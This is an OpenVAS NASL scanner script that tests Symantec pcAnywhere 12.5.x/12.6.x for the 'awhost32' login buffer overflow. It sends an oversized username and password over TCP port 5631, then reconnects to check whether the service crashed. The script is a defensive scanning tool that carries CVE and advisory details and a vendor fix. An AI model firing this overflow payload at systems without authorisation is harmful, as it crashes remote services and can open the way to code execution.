###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symantec_pcanywhere_awhost32_code_exec_vuln.nasl 11855 2018-10-12 07:34:51Z cfischer $
#
# Symantec pcAnywhere 'awhost32' Remote Code Execution Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:symantec:pcanywhere";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802884");
  script_version("$Revision: 11855 $");
  script_cve_id("CVE-2011-3478", "CVE-2011-3479", "CVE-2012-0292", "CVE-2012-0291");
  script_bugtraq_id(51592);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 09:34:51 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-07-09 12:27:08 +0530 (Mon, 09 Jul 2012)");
  script_name("Symantec pcAnywhere 'awhost32' Remote Code Execution Vulnerability");

  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_symantec_pcanywhere_access_server_detect.nasl");
  script_require_ports("Services/unknown", 5631);
  script_mandatory_keys("Symantec/pcAnywhere-server/Installed");
  script_family("Buffer overflow");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause buffer overflow
  condition or execute arbitrary code or cause a denial of service condition.");
  script_tag(name:"affected", value:"Symantec pcAnywhere version 12.5.x through 12.5.3

  Symantec pcAnywhere Solution shipped with Altiris IT Management Suite 7.0 (12.5.x)

  Symantec pcAnywhere Solution shipped with Altiris IT Management Suite 7.1 (12.6.x)");
  script_tag(name:"insight", value:"The host services component 'awhost32' fails to filter crafted long
  login and authentication data sent on TCP port 5631, which could be
  exploited by remote attackers to cause a buffer overflow condition.");
  script_tag(name:"solution", value:"Upgrade to Symantec pcAnywhere 12.5 SP4 or pcAnywhere Solution 12.6.7
  or Apply Symantec hotfix TECH182142.");
  script_tag(name:"summary", value:"This host is running Symantec pcAnywhere and is prone to remote
  code execution vulnerability.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47744");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2012/Jan/154");
  script_xref(name:"URL", value:"http://seclists.org/bugtraq/2012/Jan/161");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19407");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-12-018");
  script_xref(name:"URL", value:"http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120301_00");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120124_00");
  exit(0);
}

include("host_details.inc");

if(!pcAnyport = get_app_port(cpe:CPE)){
  exit(0);
}

soc = open_sock_tcp(pcAnyport);
if(!soc){
  exit(0);
}

# nb: Initial request
initial = raw_string(0x00, 0x00, 0x00, 0x00);
send(socket:soc, data: initial);
sleep(2);
resp = recv(socket:soc, length:1024);

# nb: Handshake Packet to Enter login details
handshake = raw_string(0x0d, 0x06, 0xfe);

# nb: Login Request
send(socket:soc, data: handshake);
resp = recv(socket:soc, length:1024);

if(!resp || "Enter login name" >!< resp)
{
  close(soc);
  exit(0);
}

# nb: Malformed Username
pcuser = raw_string(crap(data:raw_string(0x41), length: 30000));
pcuser = pcuser + pcuser + pcuser;

send(socket:soc, data: pcuser);
sleep(3);

# nb: Malformed Password
pcpass = raw_string(crap(data:raw_string(0x42), length: 28000));
pcpass = pcpass + pcpass + pcpass ;

send(socket:soc, data: pcpass);
close(soc);
sleep(3);

soc2 = open_sock_tcp(pcAnyport);
if(!soc2){
  security_message(port:pcAnyport);
  exit(0);
} else {
  send(socket:soc2, data: initial);
  resp = recv(socket:soc2, length:1024);
  close(soc2);
  if(!resp) {
    security_message(port:pcAnyport);
    exit(0);
  }
}

exit(99);